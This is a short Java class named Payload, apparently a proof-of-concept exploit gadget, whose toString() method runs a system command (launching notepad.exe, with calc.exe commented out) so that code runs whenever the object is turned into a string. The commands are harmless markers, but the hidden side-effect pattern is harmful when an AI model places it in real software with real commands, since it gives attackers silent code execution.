package com.inspur.auto;

import java.io.IOException;

public class Payload {
    @Override
    public String toString() {
        // TODO Auto-generated method stub
        try {
            //Runtime.getRuntime().exec("calc.exe");
            Runtime.getRuntime().exec("notepad.exe");
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return "OK";
    }
}
